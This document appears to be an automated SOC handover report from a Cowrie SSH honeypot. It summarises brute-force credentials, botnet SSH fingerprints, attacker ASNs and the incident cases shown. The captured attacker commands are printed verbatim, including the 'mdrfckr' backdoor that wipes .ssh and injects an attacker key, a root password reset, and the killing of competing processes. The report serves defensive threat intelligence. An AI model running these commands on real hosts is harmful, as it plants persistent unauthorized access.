# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-24 |
| **Generated At** | 2026-05-24T21:01:12Z |
| **Shift Time** | 21:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **219** |
| Confirmed Threats | **136** |
| False Positives Filtered | **83** (37.9%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **16** |
| High Severity Cases | **47** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **172** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **110** |
| Unique Credential Pairs | **56** |
| Unique Usernames | **35** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 48 |
| `345gs5662d34` | 23 |
| `cloud` | 3 |
| `a` | 2 |
| `iksi` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 23 |
| `3245gs5662d34` | 23 |
| `123456` | 4 |
| `fjbdfdjkdsfs541544@@` | 4 |
| `123` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 23 |
| `root` | `3245gs5662d34` | 23 |
| `root` | `fjbdfdjkdsfs541544@@` | 4 |
| `cloud` | `Wangsu@2017` | 3 |
| `root` | `fjbdfdjkdsfs541544AA@@` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ABCabc123` | `101.47.156.21` | 2026-05-24T19:27:11 |
| `root` | `3245gs5662d34` | `101.47.156.21` | 2026-05-24T19:27:13 |
| `root` | `oracle1234` | `101.47.156.21` | 2026-05-24T19:31:11 |
| `root` | `12345Abc` | `103.106.79.66` | 2026-05-24T19:39:02 |
| `root` | `3245gs5662d34` | `103.106.79.66` | 2026-05-24T19:39:05 |
| `root` | `p` | `123.58.219.3` | 2026-05-24T19:40:38 |
| `root` | `123456789aA@` | `103.31.39.72` | 2026-05-24T19:41:11 |
| `root` | `3245gs5662d34` | `103.31.39.72` | 2026-05-24T19:41:15 |
| `root` | `Xj123456` | `103.31.39.72` | 2026-05-24T19:41:23 |
| `root` | `Abc123456#` | `103.31.39.72` | 2026-05-24T19:41:36 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `103.31.39.72` | 2026-05-24T19:42:02 |
| `root` | `Abc@2026` | `103.31.39.72` | 2026-05-24T19:42:17 |
| `root` | `qwer1234!` | `103.31.39.72` | 2026-05-24T19:42:55 |
| `root` | `fjbdfdjkdsfs541544@@` | `103.31.39.72` | 2026-05-24T19:43:22 |
| `root` | `123@.com` | `186.251.71.202` | 2026-05-24T19:49:25 |
| `root` | `3245gs5662d34` | `186.251.71.202` | 2026-05-24T19:49:33 |
| `root` | `fjbdfdjkdsfs541544` | `186.251.71.202` | 2026-05-24T20:02:55 |
| `root` | `fjbdfdjkdsfs541544@@` | `138.113.28.120` | 2026-05-24T20:05:25 |
| `root` | `3245gs5662d34` | `138.113.28.120` | 2026-05-24T20:05:28 |
| `root` | `Admin123456*` | `174.35.25.178` | 2026-05-24T20:09:10 |
| `root` | `3245gs5662d34` | `174.35.25.178` | 2026-05-24T20:09:16 |
| `root` | `fjbdfdjkdsfs541544@@` | `186.251.71.202` | 2026-05-24T20:16:23 |
| `root` | `fjbdfdjkdsfs541544@@` | `174.35.25.178` | 2026-05-24T20:22:59 |
| `root` | `root2019` | `186.251.71.202` | 2026-05-24T20:23:13 |
| `root` | `qw12QW!@` | `174.35.25.178` | 2026-05-24T20:26:38 |
| `root` | `Abcd1234!@#$` | `186.251.71.202` | 2026-05-24T20:29:58 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `174.35.25.178` | 2026-05-24T20:33:49 |
| `root` | `Test123!@#` | `186.251.71.202` | 2026-05-24T20:43:29 |
| `root` | `mamamiya` | `174.35.25.178` | 2026-05-24T20:47:38 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `186.251.71.202` | 2026-05-24T20:56:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **219** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 110 |
| OpenSSH | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 71 | 8 |
| `03a80b21afa8...` | Modern SSH client | 39 | 4 |
| `c118de82e19e...` | Mirai/variant | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 71 | 8 | Mirai/variant |
| `03a80b21afa8...` | libssh | 39 | 4 | Modern SSH client |
| `c118de82e19e...` | OpenSSH | 5 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 23 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:TJmGcQuXssaQ"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `123.58.219.3`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.251.71.202`, `103.31.39.72`, `174.35.25.178`, `101.47.156.21`, `138.113.28.120`, `103.106.79.66`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **25** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS54994` | Meteverse Limited. | 2 | MEDIUM |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS216472` | High Speed For Internet Services L.L.C | 1 | MEDIUM |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS262826` | PW INFORMATICA E TECNOLOGIA LTDA | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (47)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1679120e236d

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:27 |
| **Last Seen** | 2026-05-24 19:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:27:10` | `cowrie.session.connect` |
| `2026-05-24 19:27:10` | `cowrie.client.version` |
| `2026-05-24 19:27:10` | `cowrie.client.kex` |
| `2026-05-24 19:27:11` | `cowrie.login.success` |
| `2026-05-24 19:27:11` | `cowrie.session.params` |
| `2026-05-24 19:27:11` | `cowrie.command.input` |
| `2026-05-24 19:27:11` | `cowrie.command.failed` |
| `2026-05-24 19:27:11` | `cowrie.log.closed` |
| `2026-05-24 19:27:11` | `cowrie.session.params` |
| `2026-05-24 19:27:11` | `cowrie.command.input` |
| `2026-05-24 19:27:11` | `cowrie.session.file_download` |
| `2026-05-24 19:27:11` | `cowrie.log.closed` |
| `2026-05-24 19:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8940106448

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:27 |
| **Last Seen** | 2026-05-24 19:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:27:13` | `cowrie.session.connect` |
| `2026-05-24 19:27:13` | `cowrie.client.version` |
| `2026-05-24 19:27:13` | `cowrie.client.kex` |
| `2026-05-24 19:27:13` | `cowrie.login.success` |
| `2026-05-24 19:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59deab95c022

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:31 |
| **Last Seen** | 2026-05-24 19:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:31:11` | `cowrie.session.connect` |
| `2026-05-24 19:31:11` | `cowrie.client.version` |
| `2026-05-24 19:31:11` | `cowrie.client.kex` |
| `2026-05-24 19:31:11` | `cowrie.login.success` |
| `2026-05-24 19:31:12` | `cowrie.session.params` |
| `2026-05-24 19:31:12` | `cowrie.command.input` |
| `2026-05-24 19:31:12` | `cowrie.command.failed` |
| `2026-05-24 19:31:12` | `cowrie.log.closed` |
| `2026-05-24 19:31:12` | `cowrie.session.params` |
| `2026-05-24 19:31:12` | `cowrie.command.input` |
| `2026-05-24 19:31:12` | `cowrie.session.file_download` |
| `2026-05-24 19:31:12` | `cowrie.log.closed` |
| `2026-05-24 19:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f6db5322ad

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:31 |
| **Last Seen** | 2026-05-24 19:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:31:13` | `cowrie.session.connect` |
| `2026-05-24 19:31:13` | `cowrie.client.version` |
| `2026-05-24 19:31:13` | `cowrie.client.kex` |
| `2026-05-24 19:31:14` | `cowrie.login.success` |
| `2026-05-24 19:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d5c40a3238

| Field | Detail |
|---|---|
| **Source IP** | `103.106.79[.]66` |
| **First Seen** | 2026-05-24 19:39 |
| **Last Seen** | 2026-05-24 19:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:39:01` | `cowrie.session.connect` |
| `2026-05-24 19:39:01` | `cowrie.client.version` |
| `2026-05-24 19:39:01` | `cowrie.client.kex` |
| `2026-05-24 19:39:02` | `cowrie.login.success` |
| `2026-05-24 19:39:02` | `cowrie.session.params` |
| `2026-05-24 19:39:02` | `cowrie.command.input` |
| `2026-05-24 19:39:02` | `cowrie.command.failed` |
| `2026-05-24 19:39:02` | `cowrie.log.closed` |
| `2026-05-24 19:39:03` | `cowrie.session.params` |
| `2026-05-24 19:39:03` | `cowrie.command.input` |
| `2026-05-24 19:39:03` | `cowrie.session.file_download` |
| `2026-05-24 19:39:03` | `cowrie.log.closed` |
| `2026-05-24 19:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.106.79[.]66` to AbuseIPDB if not already reported
- [ ] Block `103.106.79[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8254defc9880

| Field | Detail |
|---|---|
| **Source IP** | `103.106.79[.]66` |
| **First Seen** | 2026-05-24 19:39 |
| **Last Seen** | 2026-05-24 19:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:39:04` | `cowrie.session.connect` |
| `2026-05-24 19:39:04` | `cowrie.client.version` |
| `2026-05-24 19:39:05` | `cowrie.client.kex` |
| `2026-05-24 19:39:05` | `cowrie.login.success` |
| `2026-05-24 19:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.106.79[.]66` to AbuseIPDB if not already reported
- [ ] Block `103.106.79[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-388f22638744

| Field | Detail |
|---|---|
| **Source IP** | `123.58.219[.]3` |
| **First Seen** | 2026-05-24 19:40 |
| **Last Seen** | 2026-05-24 19:41 |
| **Session Duration** | 75s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TJmGcQuXssaQ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:40:37` | `cowrie.session.connect` |
| `2026-05-24 19:40:38` | `cowrie.client.version` |
| `2026-05-24 19:40:38` | `cowrie.client.kex` |
| `2026-05-24 19:40:38` | `cowrie.login.success` |
| `2026-05-24 19:40:38` | `cowrie.session.params` |
| `2026-05-24 19:40:38` | `cowrie.command.input` |
| `2026-05-24 19:40:38` | `cowrie.command.failed` |
| `2026-05-24 19:40:38` | `cowrie.log.closed` |
| `2026-05-24 19:40:39` | `cowrie.session.params` |
| `2026-05-24 19:40:39` | `cowrie.command.input` |
| `2026-05-24 19:40:39` | `cowrie.session.file_download` |
| `2026-05-24 19:40:39` | `cowrie.log.closed` |
| `2026-05-24 19:41:07` | `cowrie.session.params` |
| `2026-05-24 19:41:07` | `cowrie.command.input` |
| `2026-05-24 19:41:07` | `cowrie.log.closed` |
| `2026-05-24 19:41:07` | `cowrie.session.params` |
| `2026-05-24 19:41:07` | `cowrie.command.input` |
| `2026-05-24 19:41:07` | `cowrie.log.closed` |
| `2026-05-24 19:41:08` | `cowrie.session.params` |
| `2026-05-24 19:41:08` | `cowrie.command.input` |
| `2026-05-24 19:41:08` | `cowrie.session.file_download` |
| `2026-05-24 19:41:08` | `cowrie.log.closed` |
| `2026-05-24 19:41:08` | `cowrie.session.params` |
| `2026-05-24 19:41:08` | `cowrie.command.input` |
| `2026-05-24 19:41:08` | `cowrie.log.closed` |
| `2026-05-24 19:41:08` | `cowrie.session.params` |
| `2026-05-24 19:41:08` | `cowrie.command.input` |
| `2026-05-24 19:41:09` | `cowrie.log.closed` |
| `2026-05-24 19:41:09` | `cowrie.session.params` |
| `2026-05-24 19:41:09` | `cowrie.command.input` |
| `2026-05-24 19:41:09` | `cowrie.command.input` |
| `2026-05-24 19:41:09` | `cowrie.log.closed` |
| `2026-05-24 19:41:09` | `cowrie.session.params` |
| `2026-05-24 19:41:09` | `cowrie.command.input` |
| `2026-05-24 19:41:09` | `cowrie.log.closed` |
| `2026-05-24 19:41:09` | `cowrie.session.params` |
| `2026-05-24 19:41:09` | `cowrie.command.input` |
| `2026-05-24 19:41:10` | `cowrie.log.closed` |
| `2026-05-24 19:41:10` | `cowrie.session.params` |
| `2026-05-24 19:41:10` | `cowrie.command.input` |
| `2026-05-24 19:41:10` | `cowrie.log.closed` |
| `2026-05-24 19:41:10` | `cowrie.session.params` |
| `2026-05-24 19:41:10` | `cowrie.command.input` |
| `2026-05-24 19:41:10` | `cowrie.log.closed` |
| `2026-05-24 19:41:10` | `cowrie.session.params` |
| `2026-05-24 19:41:10` | `cowrie.command.input` |
| `2026-05-24 19:41:11` | `cowrie.log.closed` |
| `2026-05-24 19:41:11` | `cowrie.session.params` |
| `2026-05-24 19:41:11` | `cowrie.command.input` |
| `2026-05-24 19:41:11` | `cowrie.log.closed` |
| `2026-05-24 19:41:11` | `cowrie.session.params` |
| `2026-05-24 19:41:11` | `cowrie.command.input` |
| `2026-05-24 19:41:12` | `cowrie.log.closed` |
| `2026-05-24 19:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.58.219[.]3` to AbuseIPDB if not already reported
- [ ] Block `123.58.219[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eff99f79a2d

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:41 |
| **Last Seen** | 2026-05-24 19:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:41:10` | `cowrie.session.connect` |
| `2026-05-24 19:41:10` | `cowrie.client.version` |
| `2026-05-24 19:41:10` | `cowrie.client.kex` |
| `2026-05-24 19:41:11` | `cowrie.login.success` |
| `2026-05-24 19:41:11` | `cowrie.session.params` |
| `2026-05-24 19:41:11` | `cowrie.command.input` |
| `2026-05-24 19:41:11` | `cowrie.command.failed` |
| `2026-05-24 19:41:11` | `cowrie.log.closed` |
| `2026-05-24 19:41:12` | `cowrie.session.params` |
| `2026-05-24 19:41:12` | `cowrie.command.input` |
| `2026-05-24 19:41:12` | `cowrie.session.file_download` |
| `2026-05-24 19:41:12` | `cowrie.log.closed` |
| `2026-05-24 19:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0410cc61e8e0

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:41 |
| **Last Seen** | 2026-05-24 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:41:14` | `cowrie.session.connect` |
| `2026-05-24 19:41:14` | `cowrie.client.version` |
| `2026-05-24 19:41:15` | `cowrie.client.kex` |
| `2026-05-24 19:41:15` | `cowrie.login.success` |
| `2026-05-24 19:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfbcbda183cf

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:41 |
| **Last Seen** | 2026-05-24 19:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
